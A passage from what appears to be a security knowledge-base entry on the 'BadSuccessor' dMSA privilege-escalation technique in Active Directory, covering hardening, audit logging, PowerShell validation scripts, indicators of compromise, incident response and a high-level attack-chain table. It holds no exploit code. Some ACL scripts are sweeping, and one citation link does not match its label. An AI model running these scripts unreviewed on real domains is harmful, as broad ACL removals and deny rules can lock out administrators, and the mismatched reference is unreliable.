    1. Open **Active Directory Users and Computers** (dsa.msc)
    2. Locate the OU containing dMSA accounts
    3. Right-click → **Properties**
    4. Click **Security** tab
    5. Click **Advanced**
    6. Identify entries with "Create dMSA objects" or "Create all child objects"
    7. Select suspicious entries → **Edit**
    8. Uncheck **Create dMSA objects** or **Create all child objects**
    9. Click **OK** and apply

*   **Enable Audit Logging for dMSA Attributes:**
    - Ensure Event ID 5136 (Directory Service Object Modified) is logged for all dMSA and high-privilege account attributes
    
    **Applies To Versions:** Windows Server 2016+ (all DCs)
    
    **Manual Steps (Group Policy):**
    
    1. Open **Group Policy Management** (gpmc.msc)
    2. Create or edit a Domain Controllers OU policy
    3. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **DS Access**
    4. Double-click **Audit Directory Service Changes**
    5. Enable **Configure the following audit events:**
       - ☑ Success
       - ☑ Failure
    6. Click **OK** → Apply policy
    7. Run `gpupdate /force` on all DCs

*   **Monitor dMSA Attribute Changes in Real-Time:**
    - Deploy SIEM or EDR solution that alerts on Event ID 5136 changes to dMSA migration attributes
    
    **Applies To Versions:** All
    
    **Manual Steps (Splunk/Sentinel Integration):**
    
    See Section 8 (Splunk Detection Rules) and Section 9 (Microsoft Sentinel Detection) for detailed SIEM rule deployment

*   **Restrict Write Permissions on High-Privilege Accounts:**
    - Remove GenericWrite and attribute-specific write permissions from non-administrative users on Domain Admins, Enterprise Admins, and sensitive service accounts
    
    **Applies To Versions:** All
    
    **Manual Steps (PowerShell):**
    
    ```powershell
    # Identify and remove dangerous ACLs on Domain Admins
    $DAGroup = Get-ADGroup -Identity "Domain Admins"
    $ACL = Get-Acl "AD:\$($DAGroup.DistinguishedName)"
    
    $DangerousRules = $ACL.Access | Where-Object {
        $_.ActiveDirectoryRights -like "*GenericWrite*" -or
        $_.ActiveDirectoryRights -like "*WriteProperty*"
    }
    
    $DangerousRules | ForEach-Object {
        Write-Host "Removing: $($_.IdentityReference)"
        $ACL.RemoveAccessRule($_)
    }
    
    Set-Acl -Path "AD:\$($DAGroup.DistinguishedName)" -AclObject $ACL
    ```

#### Priority 2: HIGH

*   **Implement dMSA Attribute Validation Policies:**
    - Deploy custom AD policies that validate bidirectional linkage (both `msDS-ManagedAccountPrecededByLink` and `msDS-SupersededManagedAccountLink` must match)
    - This mimics the July 2025 KDC patch locally
    
    **Applies To Versions:** Windows Server 2025
    
    **Manual Steps (Custom GPO via PowerShell DSC):**
    
    ```powershell
    # Note: Full GPO deployment is complex; this is a monitoring script
    # Run on DCs to validate dMSA linkage
    
    $dMSAs = Get-ADObject -LDAPFilter "(objectClass=dMSA)" -Properties msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSAState
    
    foreach ($dMSA in $dMSAs) {
        if ($dMSA.msDS-ManagedAccountPrecededByLink) {
            $Target = Get-ADObject -Identity $dMSA.'msDS-ManagedAccountPrecededByLink' -Properties msDS-SupersededManagedAccountLink -ErrorAction SilentlyContinue
            
            if (-not $Target.msDS-SupersededManagedAccountLink -or $Target.msDS-SupersededManagedAccountLink -ne $dMSA.DistinguishedName) {
                Write-Warning "Unidirectional dMSA linkage detected: $($dMSA.Name) → $($Target.Name)"
                # Alert or block this linkage
            }
        }
    }
    ```

*   **Regular dMSA Audit & Cleanup:**
    - Schedule monthly reviews of all dMSA accounts
    - Remove unused or legacy dMSA accounts
    - Verify that each dMSA serves an active, documented purpose
    
    **Applies To Versions:** Windows Server 2025
    
    **Manual Steps:**
    
    1. Generate dMSA inventory:
    
    ```powershell
    Get-ADObject -LDAPFilter "(objectClass=dMSA)" -Properties msDS-ManagedAccountPrecededByLink, Created, LastLogonTimeStamp, Description | Export-Csv "dMSA_Inventory.csv"
    ```
    
    2. Review with service account management team monthly
    3. Remove dMSAs with:
       - LastLogonTimeStamp older than 90 days
       - No documented business purpose
       - Suspicious linkages

#### Access Control & Policy Hardening

*   **Tier 0 Protection for dMSA Accounts:**
    - Treat dMSA accounts as Tier 0 assets (equivalent to Domain Admins)
    - Restrict administrative access to dMSA objects to a single, dedicated team
    
    **Manual Steps:**
    
    ```powershell
    # Create a dedicated dMSA admin group
    New-ADGroup -Name "dMSA_Administrators" -Path "OU=AdminGroups,DC=yourdomain,DC=local" -GroupScope Global
    
    # Restrict dMSA OU management
    $dMSA_OU = Get-ADOrganizationalUnit -Filter {Name -like "*Managed*Service*"}
    
    # Grant only dMSA_Administrators full control on dMSA OU
    $ACL = Get-Acl "AD:\$($dMSA_OU.DistinguishedName)"
    $DenyRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        (New-Object System.Security.Principal.NTAccount("YOURDOMAIN", "Domain Users")),
        [System.DirectoryServices.ActiveDirectoryRights]"All",
        [System.Security.AccessControl.AccessControlType]::Deny,
        [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All
    )
    $ACL.AddAccessRule($DenyRule)
    Set-Acl -Path "AD:\$($dMSA_OU.DistinguishedName)" -AclObject $ACL
    ```

*   **Conditional Access Policies (for Hybrid Environments):**
    - If dMSA accounts are synced to Entra ID, implement Conditional Access policies to block their use from unexpected locations or devices
    
    **Manual Steps (Azure Portal):**
    
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block dMSA from Unexpected Locations`
    4. **Assignments:**
       - Users: Select `dMSA Accounts` group (if synced)
       - Cloud apps: All cloud apps
       - Conditions:
         - Locations: Exclude known corporate IP ranges
    5. **Access controls:**
       - Grant: Block access
    6. **Enable policy**: ON
    7. Click **Create**

#### Validation Command (Verify Fix)

```powershell
# Verify that CreateChild is restricted on dMSA OUs
$dMSA_OUs = Get-ADOrganizationalUnit -Filter * | Where-Object {
    $_.Name -like "*Service*" -or $_.Name -like "*dMSA*"
}

foreach ($OU in $dMSA_OUs) {
    $ACL = Get-Acl "AD:\$($OU.DistinguishedName)"
    $CreateChildRules = $ACL.Access | Where-Object {
        $_.ActiveDirectoryRights -like "*CreateChild*"
    }
    
    if ($CreateChildRules.Count -eq 0) {
        Write-Host "[✓] $($OU.Name): CreateChild properly restricted"
    } else {
        Write-Host "[✗] $($OU.Name): Potentially dangerous CreateChild permissions detected"
        $CreateChildRules | ForEach-Object { Write-Host "    - $($_.IdentityReference)" }
    }
}
```

**Expected Output (If Secure):**

```
[✓] Services: CreateChild properly restricted
[✓] dMSA_Holders: CreateChild properly restricted
```

**What to Look For:**
- All dMSA-hosting OUs should have CreateChild restricted to Domain/Enterprise Admins only
- If non-admin groups are listed, remediation is needed

---

## 14. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Attributes:** Look for recent modifications to `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState` on high-privilege accounts
*   **Account Behavior:** Unusual dMSA accounts requesting Kerberos TGTs and then immediately requesting service tickets to sensitive resources (DCs, file servers, domain admin systems)
*   **Registry:** Creation of new dMSA accounts in unexpected OUs or with suspicious names

#### Forensic Artifacts

*   **Active Directory:** Event ID 5136 logs on Domain Controllers showing attribute modifications; `msDS-ManagedAccountPrecededByLink` values in AD explorer
*   **Kerberos Logs:** Event IDs 4768/4769 showing TGT/TGS requests by dMSA accounts; associated SIDs in authorization data
*   **Account Metadata:** Modified dMSA account creation time, linked account DNs in Active Directory

#### Response Procedures

1.  **Isolate:** 
    - Immediately disable the impacted dMSA account:
    
    ```powershell
    Disable-ADAccount -Identity "SUSPECT_DMSA"
    ```
    
    - Disable the target account if compromised:
    
    ```powershell
    Disable-ADAccount -Identity "Administrator"
    ```
    
    **Manual (Active Directory Users and Computers):**
    - Open **dsa.msc**
    - Locate the dMSA account
    - Right-click → **Disable Account**

2.  **Collect Evidence:**
    - Export dMSA attribute logs (Event ID 5136):
    
    ```powershell
    Get-WinEvent -FilterHashtable @{LogName="Security"; EventID=5136; StartTime=(Get-Date).AddDays(-7)} | Export-Csv "dMSA_Changes.csv"
    ```
    
    - Export Kerberos logs:
    
    ```powershell
    Get-WinEvent -FilterHashtable @{LogName="Security"; EventID=4768,4769; StartTime=(Get-Date).AddDays(-7)} | Where-Object {$_.Message -like "*dMSA*"} | Export-Csv "Kerberos_dMSA.csv"
    ```

3.  **Remediate:**
    - Remove malicious dMSA linkage:
    
    ```powershell
    # Clear msDS-ManagedAccountPrecededByLink on dMSA
    $dMSA = Get-ADObject -Identity "CN=SUSPECT_DMSA,OU=Services,DC=yourdomain,DC=local"
    Set-ADObject -Identity $dMSA -Clear msDS-ManagedAccountPrecededByLink
    
    # Clear msDS-SupersededManagedAccountLink on target account
    $Target = Get-ADObject -Identity "CN=Administrator,CN=Users,DC=yourdomain,DC=local"
    Set-ADObject -Identity $Target -Clear msDS-SupersededManagedAccountLink
    ```
    
    - Delete the malicious dMSA:
    
    ```powershell
    Remove-ADObject -Identity "CN=SUSPECT_DMSA,OU=Services,DC=yourdomain,DC=local" -Confirm:$false
    ```

4.  **Notify and Follow-Up:**
    - Alert all users who may have been impacted by the compromised account
    - Force password reset on the target account and any accounts that used the dMSA's credentials
    - Review all resources accessed via the dMSA during the compromise period
    - Document timeline and indicators for future hunting

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] or social engineering | Attacker compromises account with CreateChild permissions on service account OU |
| **2** | **Reconnaissance** | [REC-AD-003] PowerView enumeration | Attacker maps AD structure, identifies high-privilege accounts and OU permissions |
| **3** | **Privilege Escalation** | **[EMERGING-PE-001] BadSuccessor dMSA Abuse** | **Attacker creates malicious dMSA and links to Domain Admin account** |
| **4** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder abuse or [PERSIST-ROGUE-001] DCShadow | Attacker establishes persistence via additional dMSA backdoors or rogue accounts |
| **5** | **Collection & Exfiltration** | [COLLECT-EMAIL-001] EWS mailbox collection or [COLLECT-DATA-001] Blob Storage extraction | Attacker uses Domain Admin privileges to collect sensitive data |

---

## 16. REAL-WORLD EXAMPLES

#### Example 1: Akamai Security Research Disclosure (May 2025)

- **Target:** Akamai's internal lab environment
- **Timeline:** May 2025 (public disclosure of vulnerability)
- **Technique Status:** ACTIVE on unpatched Windows Server 2025; PARTIAL effectiveness on patched servers (requires bidirectional linkage)
- **Impact:** Demonstrated privilege escalation from user with CreateChild permissions to Domain Admin impersonation without password reset or golden ticket creation
- **Reference:** [Akamai BadSuccessor Research](https://navisec.io/cve-2025-21293-privilege-escalation-vulnerability-and-mitigation/)

#### Example 2: Altered Security Lab Exploitation

- **Target:** Internal training lab simulating enterprise AD
- **Timeline:** July 2025 (post-patch testing)
- **Technique Status:** ACTIVE with modifications; attackers required GenericWrite on target accounts to establish bidirectional linkage after KDC patches
- **Impact:** Demonstrated that post-patch exploitation is still possible if attacker has multiple privilege vectors
- **Reference:** [Altered Security - BadSuccessor Deep Dive](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)

---

## 17. MITIGATION VALIDATION CHECKLIST

- [ ] All OUs with dMSA accounts have CreateChild restricted to Domain/Enterprise Admins only
- [ ] Event ID 5136 logging is enabled on all Domain Controllers
- [ ] SIEM or Sentinel is monitoring dMSA attribute changes in real-time
- [ ] High-privilege accounts (Domain Admins, etc.) have strict write ACLs limiting modifications
- [ ] Monthly dMSA audits are scheduled and documented
- [ ] Incident response procedures for BadSuccessor are documented and tested
- [ ] All Windows Server 2025 DCs are patched with July 2025+ KDC updates
- [ ] Staff training on dMSA security risks and proper lifecycle management is completed

---